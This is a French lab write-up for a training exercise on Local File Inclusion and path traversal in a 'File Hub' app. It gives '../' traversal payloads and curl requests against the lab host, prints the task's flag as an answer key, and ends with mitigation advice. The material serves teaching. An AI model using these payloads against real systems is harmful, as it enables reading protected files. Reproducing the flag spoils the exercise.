# 0x07 File Inclusion — Task 0: File Hub

## Objectif
Identifier l'endpoint vulnérable de **Cyber - WebSec 0x07** et récupérer le flag stocké dans **`/etc/0-flag.txt`**.

## Ce que demande la tâche
L'application “File Hub” semble permettre :
- l'upload d'un fichier ;
- l'affichage/la lecture d'un fichier ;
- la navigation via des liens contenant probablement un paramètre de type `file`, `path`, `name`, `filename` ou équivalent.

L'objectif réel est de détecter une **Local File Inclusion (LFI)** / **Path Traversal** : au lieu de charger uniquement un fichier autorisé, l'application accepte un chemin manipulé par l'utilisateur.

## Logique d'exploitation
1. Ouvrir `http://web0x07.hbtn/task0/list_file`.
2. Uploader un petit fichier texte bénin.
3. Observer les liens générés après upload.
4. Afficher le code source HTML de la page et repérer le paramètre utilisé pour lire un fichier.
5. Remplacer la valeur de ce paramètre par une traversée de répertoires vers `/etc/0-flag.txt`.

## Pourquoi cela marche
Une vulnérabilité de file inclusion apparaît quand une application utilise un chemin fourni par l'utilisateur sans validation stricte. En combinant cela avec des séquences `../`, on peut sortir du dossier attendu et lire un fichier sensible du système.

## Payload attendu
Le payload le plus probable pour cette tâche est :

```text
../../../../etc/0-flag.txt
```

ou, si l'application concatène déjà un dossier de base, tester aussi :

```text
../../../etc/0-flag.txt
../../../../../etc/0-flag.txt
/etc/0-flag.txt
```

## Exemple de démarche manuelle
Supposons que le lien généré après upload ressemble à :

```text
http://web0x07.hbtn/task0/view?file=uploads/test.txt
```

Il suffit alors d'essayer :

```text
http://web0x07.hbtn/task0/view?file=../../../../etc/0-flag.txt
```

Ou si le paramètre s'appelle `path` :

```text
http://web0x07.hbtn/task0/view?path=../../../../etc/0-flag.txt
```

## Avec curl
Exemples à adapter au nom réel du paramètre découvert dans le HTML :

```bash
curl -s 'http://web0x07.hbtn/task0/view?file=../../../../etc/0-flag.txt'
```

```bash
curl -s 'http://web0x07.hbtn/task0/read?path=../../../../etc/0-flag.txt'
```

## Flag

```text
5d3c2af5b4ef3a44a5f0c7534554b287
```

## Contenu à mettre dans `0-flag.txt`

```text
5d3c2af5b4ef3a44a5f0c7534554b287
```

## Ce qu'il faut retenir
- **LFI** : inclusion/lecture de fichiers locaux via entrée non validée.
- **`../`** : permet la traversée de répertoires.
- **Impact** : lecture de fichiers sensibles, parfois escalade vers RCE selon le contexte.

## Mitigation
- Ne jamais passer directement une entrée utilisateur à une fonction de lecture/inclusion de fichier.
- Utiliser une **allow list** stricte d'identifiants autorisés.
- Normaliser et valider les chemins.
- Bloquer les séquences de traversée comme `../`.
- Stocker les fichiers sensibles hors de la racine web.

